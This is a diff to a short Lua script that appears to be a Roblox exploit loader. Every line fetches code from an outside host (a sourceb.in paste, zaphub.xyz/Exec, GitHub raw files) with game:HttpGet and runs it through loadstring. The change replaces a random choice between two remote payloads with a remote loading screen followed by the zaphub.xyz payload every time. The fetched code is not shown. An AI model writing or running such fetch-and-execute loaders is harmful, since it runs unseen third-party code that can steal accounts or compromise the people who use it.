@@ -1,9 +1,5 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/snItpmyGmz/0", true))()
 wait(0.1)
-
-local chance = math.random(1, 100)
-if chance <= 75 then
-    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
-else
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BotMark69/ps/refs/heads/main/ty"))()
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BotMark69/madebyme/refs/heads/main/loadingscreen"))()
+wait(3)
+loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
